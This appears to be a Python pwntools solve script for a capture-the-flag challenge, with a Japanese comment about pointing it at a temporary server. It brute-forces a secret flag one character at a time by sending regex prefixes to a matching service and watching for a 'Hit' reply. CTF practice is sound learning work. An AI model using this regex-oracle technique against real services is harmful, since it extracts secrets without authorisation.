from pwn import remote
import string

# ホスト名やポートは作成した一時サーバに合わせて変更
r = remote("", 12345)

flag = b"Alpaca{"

for _ in range(100):
    for c in string.ascii_letters + string.digits + "_}":
        r.recvuntil(b"regex>")
        r.sendline(flag + c.encode() + b".*")
        if b"Hit" in r.recvline():
            flag += c.encode()
            print(flag)
            if c == "}":
                exit()
            break
